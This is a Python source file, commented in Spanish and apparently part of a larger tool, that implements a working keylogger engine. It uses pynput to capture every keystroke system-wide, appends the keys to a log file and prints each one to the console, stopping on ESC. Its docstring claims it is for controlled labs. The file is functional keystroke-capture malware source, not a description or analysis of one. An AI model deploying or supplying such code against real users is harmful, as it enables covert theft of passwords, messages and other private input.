try:
    from pynput.keyboard import Key, Listener
except ImportError:
    msg = (
        "[ERROR] 'pynput' no está instalado. "
        "Instálalo con 'pip install pynput'"
    )
    print(msg)
    Listener = None


class RealEngine:
    """
    Motor real de captura para uso en laboratorios controlados.
    """

    def __init__(self, output=None):
        self.output_file = output or "logs/captured_keys.log"
        self.listener = None

        # Asegurar que el directorio de logs exista
        import os
        log_dir = os.path.dirname(self.output_file)
        if log_dir and not os.path.exists(log_dir):
            os.makedirs(log_dir)

    def on_press(self, key):
        try:
            k = str(key).replace("'", "")
        except Exception:
            k = "[Error]"

        with open(self.output_file, "a") as f:
            f.write(f"{k} ")

        # Imprimir en consola para debug de laboratorio
        print(f"[Captured] {k}")

    def on_release(self, key):
        if key == Key.esc:
            # Detener el listener con la tecla ESC
            print("[*] Deteniendo captura (ESC presionado)...")
            return False

    def start(self):
        if not Listener:
            return

        msg = f"[*] Iniciando escucha... Logs en: {self.output_file}"
        print(msg)
        print("[!] Presione ESC para detener.")

        with Listener(
            on_press=self.on_press, on_release=self.on_release
        ) as listener:
            listener.join()
